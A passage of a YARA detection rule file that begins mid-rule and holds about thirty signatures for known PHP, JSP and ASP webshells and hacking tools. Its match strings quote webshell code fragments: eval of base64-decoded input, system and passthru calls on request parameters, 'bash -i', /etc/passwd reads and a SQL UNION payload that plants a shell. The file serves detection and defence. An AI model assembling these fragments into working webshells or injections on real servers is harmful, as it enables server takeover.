   meta:
      description = "PHP Webshells Github Archive - file b374k.php.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 10:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
      $s6 = "// password (default is: b374k)" 
      $s8 = "//******************************************************************************" 
      $s9 = "// b374k 2.2" fullword
      $s10 = "eval(\"?>\".gzinflate(base64_decode(" 
   condition: 
      3 of them
}

rule WebShell_h4ntu_shell__powered_by_tsoi__RID365B : DEMO SCRIPT T1033 T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 16:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1033, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
      $s13 = "$cmd = $_POST['cmd'];" fullword
      $s16 = "$uname = posix_uname( );" fullword
      $s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
      $s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>" 
      $s20 = "ob_end_clean();" fullword
   condition: 
      3 of them
}

rule WebShell_php_webshells_MyShell_RID3313 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file MyShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<title>MyShell error - Access Denied</title>" fullword
      $s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
      $s5 = "//A workdir has been asked for - we chdir to that dir." fullword
      $s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o" 
      $s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
      $s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
      $s19 = "#every command you excecute." fullword
      $s20 = "<form name=\"shell\" method=\"post\">" fullword
   condition: 
      3 of them
}

rule WebShell_php_webshells_pHpINJ_RID325E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file pHpINJ.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
      $s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
      $s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN" 
      $s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
      $s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
      $s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
      $s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
   condition: 
      1 of them
}

rule WebShell_ru24_post_sh_RID2F32 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file ru24_post_sh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://www.ru24-team.net" fullword
      $s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a" 
      $s6 = "Ru24PostWebShell" 
      $s7 = "Writed by DreAmeRz" fullword
      $s9 = "$function=passthru; // system, exec, cmd" fullword
   condition: 
      1 of them
}

rule WebShell_c99_locus7s_RID2E8A : DEMO T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file c99_locus7s.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
      $s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y" 
      $s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq" 
      $s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
      $s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
   condition: 
      2 of them
}

rule WebShell_JspWebshell_1_2_RID300A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
      $s1 = "String password=request.getParameter(\"password\");" fullword
      $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java." 
      $s7 = "String editfile=request.getParameter(\"editfile\");" fullword
      $s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
      $s12 = "password = (String)session.getAttribute(\"password\");" fullword
   condition: 
      3 of them
}

rule WebShell_cgitelnet_RID2E45 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file cgitelnet.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:07:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "# Author Homepage: http://www.rohitab.com/" fullword
      $s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
      $s18 = "# in a command line on Windows NT." fullword
      $s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
   condition: 
      2 of them
}

rule WebShell_lamashell_RID2E39 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file lamashell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
      $s8 = "$curcmd = $_POST['king'];" fullword
      $s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
      $s18 = "<title>lama's'hell v. 3.0</title>" fullword
      $s19 = "_|_  O    _    O  _|_" 
      $s20 = "$curcmd = \"ls -lah\";" fullword
   condition: 
      2 of them
}

rule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version_RID3A6D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 19:46:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
      $s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'." 
      $s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
   condition: 
      1 of them
}

rule WebShell_STNC_WebShell_v0_8_RID30CF : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:55:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
      $s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()" 
      $s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw" 
   condition: 
      2 of them
}

rule WebShell_Web_shell__c_ShAnKaR_RID3203 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
      $s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump" 
      $s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
      $s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
   condition: 
      2 of them
}

rule WebShell_Gamma_Web_Shell_RID303D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
      $s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
      $s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
      $s20 = "my $command = $self->query('command');" fullword
   condition: 
      2 of them
}

rule WebShell_php_webshells_aspydrv_RID335E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file aspydrv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files" 
      $s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
      $s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
      $s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
      $s20 = "' ---Copy Too Folder routine Start" fullword
   condition: 
      3 of them
}

rule WebShell_JspWebshell_1_2_2_RID309B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
      $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java." 
      $s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
      $s15 = "endPoint=random1.getFilePointer();" fullword
      $s20 = "if (request.getParameter(\"command\") != null) {" fullword
   condition: 
      3 of them
}

rule WebShell_g00nshell_v1_3_RID2F6B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
      $s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
      $s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
      $s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
      $s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
   condition: 
      2 of them
}

rule WebShell_php_include_w_shell_RID325E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file php-include-w-shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
      $s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
      $s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
   condition: 
      1 of them
}

rule WebShell_PhpSpy_Ver_2006_RID2F9D : DEMO T1007 T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1007, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
      $s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname." 
      $s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32" 
      $s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'" 
   condition: 
      1 of them
}

rule WebShell_ZyklonShell_RID2F05 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file ZyklonShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
      $s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
      $s2 = "<TITLE>404 Not Found</TITLE>" fullword
      $s3 = "<H1>Not Found</H1>" fullword
   condition: 
      all of them
}

rule WebShell_php_webshells_myshell_RID3353 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file myshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu" 
      $s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o" 
      $s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
      $s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT" 
   condition: 
      1 of them
}

rule WebShell_php_webshells_lolipop_RID3354 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file lolipop.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:43:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$commander = $_POST['commander']; " fullword
      $s9 = "$sourcego = $_POST['sourcego']; " fullword
      $s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
   condition: 
      all of them
}

rule WebShell_simple_cmd_RID2EA3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file simple_cmd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:23:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
      $s2 = "<title>G-Security Webshell</title>" fullword
      $s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
      $s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
   condition: 
      1 of them
}

rule WebShell_aZRaiLPhp_v1_0_2_RID2FF7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-11-23"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED" 
      $s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
      $s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
      $s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
   condition: 
      2 of them
}

rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0__RID3B1A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 20:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
      hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</" 
      $s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh" 
      $s11 = " *   Coded by Pixcher" fullword
      $s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
   condition: 
      2 of them
}

rule WebShell_Generic_PHP_7_RID2F20 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
      hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
      hash3 = "715f17e286416724e90113feab914c707a26d456"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
      $s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
      $s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
      $s4 = "if( $action == \"dumpTable\" )" fullword
   condition: 
      2 of them
}

rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall_RID3C61 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 21:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
      hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
      hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
      $s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
      $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
      $s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
   condition: 
      2 of them
}

rule WebShell_Generic_PHP_9_RID2F22 : DEMO GEN SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2014-04-06 11:44:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-12-06"
      hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
      hash2 = "0daed818cac548324ad0c5905476deef9523ad73"
      tags = "DEMO, GEN, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $ = { 3a 3c 62 3e 22 20 2e 62 61 73 65 36 34 5f 64 65 63 6f 64 65 28 24 5f 50 4f 53 54 5b 27 74 6f 74 27 5d 29 2e 20 22 3c 2f 62 3e 22 3b } 
      $ = { 69 66 20 28 69 73 73 65 74 28 24 5f 50 4f 53 54 5b 27 77 71 27 5d 29 20 26 26 20 24 5f 50 4f 53 54 5b 27 77 71 27 5d 3c 3e 22 22 29 20 7b } 
      $ = { 70 61 73 73 74 68 72 75 28 24 5f 50 4f 53 54 5b 27 63 27 5d 29 3b } 
      $ = { 3c 69 6e 70 75 74 20 74 79 70 65 3d 22 72 61 64 69 6f 22 20 6e 61 6d 65 3d 22 74 61 63 22 20 76 61 6c 75 65 3d 22 31 22 3e 42 36 34 20 44 65 63 6f 64 65 3c 62 72 3e } 
   condition: 
      1 of them
}

rule WebShell_Generic_PHP_1_RID2F1A : DEMO GEN SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files Dive Shell 1.0"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:42:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-12-06"
      hash1 = "2558e728184b8efcdb57cfab918d95b06d45de04"
      hash2 = "203a8021192531d454efbc98a3bbb8cabe09c85c"
      hash3 = "b79709eb7801a28d02919c41cc75ac695884db27"
      tags = "DEMO, GEN, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $ = { 76 61 72 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3d 20 6e 65 77 20 41 72 72 61 79 28 3c 3f 70 68 70 20 65 63 68 6f 20 24 6a 73 5f 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3f 3e 29 3b } 
      $ = { 69 66 20 28 65 6d 70 74 79 28 24 5f 53 45 53 53 49 4f 4e 5b 27 63 77 64 27 5d 29 20 7c 7c 20 21 65 6d 70 74 79 28 24 5f 52 45 51 55 45 53 54 5b 27 72 65 73 65 74 27 5d 29 29 20 7b } 
      $ = { 69 66 20 28 65 2e 6b 65 79 43 6f 64 65 20 3d 3d 20 33 38 20 26 26 20 63 75 72 72 65 6e 74 5f 6c 69 6e 65 20 3c 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 2e 6c 65 6e 67 74 68 2d 31 29 20 7b } 
   condition: 
      1 of them
}

rule WebShell__findsock_php_findsock_shell_php_reverse_shell_RID3D7D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 21:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
      hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
   condition: 
      all of them
}

rule WebShell_Generic_PHP_6_RID2F1F : DEMO GEN SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:43:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
      hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
      hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
      tags = "DEMO, GEN, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
      $s5 = "echo shell_exec($com);" fullword
      $s7 = "if($sertype == \"winda\"){" fullword
      $s8 = "function execute($com)" fullword
      $s12 = "echo decode(execute($cmd));" fullword
      $s15 = "echo system($com);" fullword
   condition: 
      4 of them
}

rule HKTL_Unpack_Injectt_RID2E35 : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Injectt.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "%s -Run                              -->To Install And Run The Service" 
      $s3 = "%s -Uninstall                        -->To Uninstall The Service" 
      $s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN" 
   condition: 
      all of them
}

rule Webshell_ASP_CmdAsp_2_RID2EB2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file CmdAsp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:25:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "' -- Read the output from our command and remove the temp file -- '" 
      $s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" 
      $s9 = "' -- create the COM objects that we will be using -- '" 
   condition: 
      all of them
}

rule MAL_vanquish_RID2BB9 : DEMO MAL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file vanquish.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:18:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, MAL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged" 
      $s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU" 
      $s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z" 
   condition: 
      all of them
}

rule HKTL_shelltools_g0t_root_uptime_RID336C : DEMO HKTL T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file uptime.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "JDiamondCSlC~" 
      $s1 = "CharactQA" 
      $s2 = "$Info: This file is packed with the UPX executable packer $" 
      $s5 = "HandlereateConso" 
      $s7 = "ION\\System\\FloatingPo" 
   condition: 
      all of them
}

